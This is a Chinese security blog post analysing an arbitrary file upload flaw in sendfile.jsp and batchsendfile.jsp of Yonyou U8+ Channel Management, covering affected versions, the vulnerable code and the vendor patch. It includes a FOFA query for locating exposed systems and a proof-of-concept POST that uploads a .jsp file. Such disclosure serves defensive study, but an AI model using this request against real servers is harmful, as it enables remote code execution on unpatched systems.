---
title: "U8+渠道管理(高级版) sendfile.jsp、batchsendfile.jsp 文件上传漏洞"
source: https://mrxn.net/jswz/yonyou-u8-sendfile-upload-rce.html
asset_dir: assets/u8+渠道管理(高级版)-sendfile.jsp、batchsendfile.jsp-文件上传漏洞
---

# U8+渠道管理(高级版) sendfile.jsp、batchsendfile.jsp 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/4 12:06
- 973浏览
- [0评论](#comment)
- 36分钟阅读

深入探索

软件

SQL

服务器

---

# 漏洞简介

U8+是用友公司推出的企业管理[软件](#)套件，广泛应用于财务、供应链、人力资源等多个业务领域。在U8+渠道管理（高级版）模块中，存在一处[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，位于其 `sendfile.jsp` 和 `batchsendfile.jsp` 文件中。攻击者可通过构造特定的HTTP请求，将恶意脚本或可执行文件上传至服务器。该漏洞可能导致攻击者在目标服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而获取服务器控制权限，进一步窃取敏感数据、篡改业务数据或对内网其他系统发起攻击。

漏洞预警服务

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V15.0, V13

# fofa语法

> title="渠道管理（高级版）"

# 漏洞分析

深入探索

SQL注入检测工具

Web安全课程

在线安全工具

直接看 sendfile.jsp 文件里有关文件处理的实现逻辑（batchsendfile.jsp处理逻辑与sendfile.jsp基本相同）

```
String objectname = "";
String repeatrule = "";
String refrule = "";
String filetype = "";
String flag = "";
String fieldimp = "";
String affix = "";
String fileFullName = "";
if(ServletFileUpload.isMultipartContent(request)){
  ServletFileUpload upload = new ServletFileUpload(new DiskFileItemFactory());
  upload.setHeaderEncoding("UTF-8");
  java.util.List<FileItem> fileItems = upload.parseRequest(request);
  for(FileItem fileItem : fileItems){
    if(fileItem.isFormField()){
      String fieldname = fileItem.getFieldName();
      if("objectname".equals(fieldname)){
        objectname = fileItem.getString("UTF-8");  
      }else if("repeatrule".equals(fieldname)){
        repeatrule = fileItem.getString("UTF-8");
      }else if("refrule".equals(fieldname)){
        refrule = fileItem.getString("UTF-8");
      }else if("filetype".equals(fieldname)){
        filetype = fileItem.getString("UTF-8");
      }else if("flag".equals(fieldname)){
        flag = fileItem.getString("UTF-8");
      }else if("fieldimp".equals(fieldname)){
        fieldimp = fileItem.getString("UTF-8");
      }
    }else{
      affix = fileItem.getName();
      String path = com.gxfcsoft.framework.base.util.PathUtil.getUserFile()+"temp"+java.io.File.separator;
      String fieldID = com.gxfcsoft.framework.base.util.UUID.getID();
      if(affix.indexOf(".")!=-1)
       fieldID +=affix.substring(affix.lastIndexOf("."));
         fileFullName = path+fieldID;
         java.io.File saveFilepath=new java.io.File(fileFullName);
         fileItem.write(saveFilepath);
    }
  }
```

深入探索

漏洞修复方案

计算机安全

网络安全培训

预先定义了多个字符串变量并给它们赋了空字符串 `""`作为初始值，然后判断当前收到的 HTTP 请求（`request` 对象，通常是 `HttpServletRequest` 类型）的内容类型（Content-Type）是否为 `multipart/form-data`。如果不是，`if` 内部的所有代码都不会执行。

物流软件安全

`isFormField()` 方法用于区分当前处理的 `fileItem` 是一个普通表单字段（例如 `<input type="text">`、`<input type="hidden">`）还是一个文件上传字段（`<input type="file">`）。如果返回 `true`，则进入 `if` 块处理普通字段；如果返回 `false`，则进入 `else` 块处理文件。

重点看文件处理部分

```
// 9. 处理文件
    }else{
      // 9.1 获取原始文件名
      affix = fileItem.getName();
      // 9.2 构建服务器存储路径
      String path = com.gxfcsoft.framework.base.util.PathUtil.getUserFile()+"temp"+java.io.File.separator;
      // 9.3 生成唯一ID作为新文件名主体
      String fieldID = com.gxfcsoft.framework.base.util.UUID.getID();
      // 9.4 保留原始文件扩展名
          if(affix.indexOf(".")!=-1)
                  fieldID +=affix.substring(affix.lastIndexOf("."));
          // 9.5 拼接成完整的文件路径
                    fileFullName = path+fieldID;
          // 9.6 创建文件对象
                    java.io.File saveFilepath=new java.io.File(fileFullName);
          // 9.7 将文件内容写入磁盘
                    fileItem.write(saveFilepath);
    }
```

首先通过 `fileItem.getName()` 获取用户上传的原始文件名，然后从该文件名中提取文件后缀，并将其与一个新生成的 UUID 拼接，构成新的文件名。最后，将文件保存到服务器上，全程没有对文件后缀和内容进行校验，因此造成任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。

# 漏洞复现

> 两个漏洞逻辑一致，仅仅是路径不一样
>
> 计算机服务器
>
> business/common/lxgzds/batchsendfile.jsp

```
POST /business/common/importdata/sendfile.jsp HTTP/1.1
Host: u8.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.jsp"

UPLOAD_TEST
------WebKitFormBoundary--
```

在响应里成功回显上传文件的完整路径，直接访问

[![U8+渠道管理(高级版) sendfile.jsp、batchsendfile.jsp 文件上传漏洞](images/img-001-55891e245e61.webp)](https://image.mrxn.net/bffd9ffbb59448f584b22c9032f88164.webp)

[![U8+渠道管理(高级版) sendfile.jsp、batchsendfile.jsp 文件上传漏洞](images/img-002-ec633a163377.webp)](https://image.mrxn.net/40742b2ddc6c4b9a92a29a8949f510ef.webp)

成功执行我们上传代码

漏洞预警服务

官方补丁修复也很直接，直接正则检测后缀是否为白名单以及是否存在目录穿越等危险字符

[![U8+渠道管理(高级版) sendfile.jsp、batchsendfile.jsp 文件上传漏洞](https://kcntosnhx7y5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjEyZGRiYjJkNDYyNTI0MTIzNWMxZWFjMWFjYzcwMzZfVU15VGhSb2RQVkp4R1VDWHNRQ2N6ZHhIaWU1Y1ZOSFVfVG9rZW46TjNtdGJBNDE3b3B1UXZ4akRaS2N2emYxbkVjXzE3NTQyMjI1NjQ6MTc1NDIyNjE2NF9WNA)](https://kcntosnhx7y5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjEyZGRiYjJkNDYyNTI0MTIzNWMxZWFjMWFjYzcwMzZfVU15VGhSb2RQVkp4R1VDWHNRQ2N6ZHhIaWU1Y1ZOSFVfVG9rZW46TjNtdGJBNDE3b3B1UXZ4akRaS2N2emYxbkVjXzE3NTQyMjI1NjQ6MTc1NDIyNjE2NF9WNA)

[![U8+渠道管理(高级版) sendfile.jsp、batchsendfile.jsp 文件上传漏洞](https://kcntosnhx7y5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGVkZWJhMzk1OTY3ODk2YTZjMWMwYjAwNDBhZWFkZWFfNVZIdXFEVUtiQTcyUUNZbHl5VEhyc0dhQWhXUUxaaTdfVG9rZW46UXJZY2JKWGtTbzRrYnF4SDRlQmNvNlZlbkZlXzE3NTQyMjI1NjQ6MTc1NDIyNjE2NF9WNA)](https://kcntosnhx7y5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGVkZWJhMzk1OTY3ODk2YTZjMWMwYjAwNDBhZWFkZWFfNVZIdXFEVUtiQTcyUUNZbHl5VEhyc0dhQWhXUUxaaTdfVG9rZW46UXJZY2JKWGtTbzRrYnF4SDRlQmNvNlZlbkZlXzE3NTQyMjI1NjQ6MTc1NDIyNjE2NF9WNA)

# 参考

- <https://security.yonyou.com/#/noticeInfo?id=723>
- <https://security.yonyou.com/#/noticeInfo?id=719>

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKx0lEQVR4AeyZi3bcug5Ds/v//3xuMOq2aVr2OGmTyV11V1GIIEgpop1Xf729vf33WfzX/tQ+ptSMK/ec8YxrXV1Xr7qa8Yy7x/iMe5/qNVe1z6wzkPe6++9PuYFlIO8TfruKo8PXeuANWHoe1USH4c06qH1cw/DAluMXMHLWdB1GHjC1cK9JYqZFBzYfW3zRK6JdRa1bBlLFe/26G9gNBMb0Yc9Hx4ThrXmfDtjmYMRAtT/W1jyC93+Ax5MIvEfP/x7Vq88YeOxh9+pR+xOG0R/2POu7G8jMdGvfdwPfNhAYT8jsCVTrH7Z6ZT1qxh9lGOc5q4PhOdoLRh44a/Oh3LcN5EOn+ofNf2UgsycImH5uhqEDu2sHHjUweGcoAuw9MDQYXOyPJQwd1u/+PDusORjrR9H7PzBiGPwufdnfvzKQLzvdP9j4awbyD17k3/qQdwPxFZ7xZza1D+xfd3P27bF6GLb1emcc/wzVax5G35rra71dr7GeztXT192beDeQiDdedwPLQGA8KfCc+3Fh1HR9FtenBLZ1MGI9MGJYvwj3nrB6eq73qXkYdX/igdEDqK0fa2DzDQocx4+C3/8sA/kd3/TiG/jlE/IZ9uzWwvoUqOn5DNsjDKN375Oc6DnjWV4Ntn1hxLC+lTA0+52xfT/L9xtydrsvyB0OBMZTASt7Plg1QHnKwONzqU8MjBj2T+DMA8Nvzk1g6LDnKx4YdfadsX16bqarnTGMPWHwzHs4kJn51r7+BpaBwJgaDO5PRWLY5vrx4hE9B9va+GCrwTauPWCeSx9R/Vmrzzj5AEZfGBztCDA88Dm2r+cxrrwMpIo/dP1PHOseyA8b8zKQ/hrBeC3refXANgfbODWw16oOJHwA2Hzhf4jv/7hfZZh73+2Hf2HUVIM91XocHUYdDI4W6L3C8R8BRl9YeRnIUdGtf+8N/IJ1OrB+K+r0Z8fpOWNYe6n1evVwz30khnUvGGvr0zs4iqPDtga2cTx/Ahj9co4OOM7db8if3PoX1O4GAmN6s71g5GCwk9drHFaTowXGlaMHMPrCMcf3DPaG0cd4xr3XZz0w9oLB9oURw8rmZnvtBjIz3dr33cDul4tnWztZGdapw3ytd9bXHIxaPeqVzcHWCyOGPVvfa2H9Wgn7Ohhar+sxDB+s/brHM1TuHuPw/YbkFn4Q7oH8oGHkKLtveyNWwPpawnatz9fR+Ixh2wPW1733gdVrz+4xDh95YPQxH4ahpe4qUncV9oSxD7CUAtMfhGO435Dcwg/CMhAnKsN2iuqV/Tjg2HvFA6Metlz3cm2/GXcPjH7qla2H4TE+Y9h6az8YOTXYxtFhaO4BI4aVl4Fouvm1N7AMBMaUrhwHtt5MPzirTT6AUQsc2uMLqgF4fN6FY9YPw5MegfoVhlELK/e69Ay6XuPkg5kW/QjLQGrhvX7dDSw/GPYjOEHYPynm5F6bGEZd1gGM2JowDC35q0hdcNUfH4x9YOX0qIivwzyMup6HoQM9NX2bd6bfArD47zfk96X8FFp+DvFp8GAwpmZcGbY52Mbx9n7GMLyw/vwRf6An6w5zMOp7vsYf8cLoB4Nrn762r7pxWE2O1gHP97jfEG/w7/Knu90D+fTVfU3hbiCwfa3qa+cR1GDrNR+G41zyFfZTg30tDK17jcMwPDDYfskFxpWjB2pZi64ZyzD2gfXTLwxt5plpsNZm391ALLr5NTfwdCAwJg57Pjtyph3AqDvzwvDA4CtePTBqAKWFs3+gkLUAlm81AS2nDDxqZibY5mAbp8a9O8PwAm9PB/J2//nWG1h+MIQxpT69epqeM9YDowegdIntI1sEPJ5IWD/PmtM7Yz0w6nsMaz/r9cwY5n2q1z6dqwe2fczVmvsN8VZ+CO8GAvMp1vPCxz2wr4GhwZZ9Yq7sCWtt9Wc96xP9KmD0vuqPD45r+nlgeGHl3UDS9MbrbuAeyOvufrrz4UCAt2BW1V+9M89HvLM+zzT7h7s35w/U4xHRK9T1hrvW43g6rnjcV2/lw4H0je74e25gGUidUl3XYzjZznpqnR5zcvW47rke6wubs/+M9cQfGFevmmzO+KNsfedZn5wp0Fs9y0CqeK9fdwPL/4c4rc6ZpPCYxp3NV7afXuPK1Z+1uazFTEvOvjM+qql1WVdYE6561tGCrDvcX924cmor9Fa+35B6Gz9gvQzESXqmHquH65SzjnaEsz7WpEdgbE000XNnHr2drQnbN+tAb9ZCj7kz1ttr1cNn9eaWgSjc/NobeDqQTFY4fbkfXV/YXNYV6mH7yNWXtXo4/hmSE6mpUD+r06/XOKxmvfGM9Zyxdd2TvcTTgfTiO/7aG3jBQL72A/p/7374/yGzD8zXSvYV7LH6jGtf66qWtXXmw9ErogVVe7aOXzzzJq+3nye5wHy4e4zjE/EFs5ye+w3xJn4IHw4kkwyc5oz9GMzFL8x9hO3zkZrqtV42NztT13qcWvvMcjUfX+Ig6+CoJh4RX2AcPhxIkje+/waWgWRSgZPNOqhHMte5elzrOYqjp3+QdYW1yYmar2u94ao/W/e+xpV7D3Pq2VN0zXjGvaZ6loFU8V6/7gaWXy56hP4UqIfNydEq1MPqPg3ROrqne43D1lpzhVMXzLzRA3NZd5hz755XD5vLOui1VTM34/sNmd3KC7V7IC+8/NnWux8MNfkKGlc+yqmH84oGte5oHV9gPvWBceXoQfwVWUcP9EcLehytY+ZRS8+g10QT5oytnfGZ935DZjf2Qu3pQJx42HM6YVm9cvxB1fo6+aDrszi+oO8ZTVjX414T3xVPfIH1RzXJxzeDNWHzWQfGqRdPB2LRzd9zA8tAnJDb9lg9nOlWROs4q+/eK/GVft3jGe1vHFbrnJww1+OuJ6/W2TOFe8449WIZiMmbX3sDy0CcUOfZ8TLtYJb7iJYegXtmHcx66Om5+IUeY73qxuHuidYxq+ueHve+9gj3XI/TaxlIghuvv4HlVydOSz47WqYd6Mk6MA4nDuyXdZBchx5148rm0uMI3WO9unFYTbZncsJcj/WaD6vJ0Y7Q+xmH7zfk6NZepN8DOb34708uvzrpW+f16dBzRdd75RXunh6nl3tmHRjPOPkKPfYN13zWerIWavEHxrK+sFrn5ER6zGA+fL8huYUfhOWL+mxyz7Szj6M/KcaznuZ6v+rtOeMzT81l7T7hxEHvYxxOPsj6KuIPrvq7735D+o28OF4GkqfmKvqZrat6npJALevAOGxd9CBaoF45+SD5iuqpetbmsr6K7CF6vfpZr17zUe8ykLPCO/d9N7AbiE/BjI+OpfcoH3325PQ6Yzl1R9AzY2vM9Th6P0+PUxNfkHUw80QP4pshOWG9rN98eDeQiDdedwP3QF5399OdXzoQX11PZiyrh9XkaIHxjJMPZrnZp4t4K3pdr+n5GttnpvU+xuGXDsRD37zewF8ZiE/B2nZdZeoVesOra7vSX9WupT6oHtd6kw/Ur3D8Qv9RP/WwXtkeyQlzZ/xXBnK2wZ372A3sBuJkZ/ystU9C+Jm35t0rdYFx9bhOPjCuHD1Qyzro8ZFW9dQkDo7Oox6Ob4bkRHo+w24gzwru/NfewDKQ2XSPtCtH8qmQrak9u3YUq1e2T9X6XubOvL1Gb/goZ9/K3dvjmVdP5WUgteBev+4G7oG87u6nO/8PAAD//1QfLCQAAAAGSURBVAMAYNGQmxeTA7wAAAAASUVORK5CYII=)

手机扫码阅读
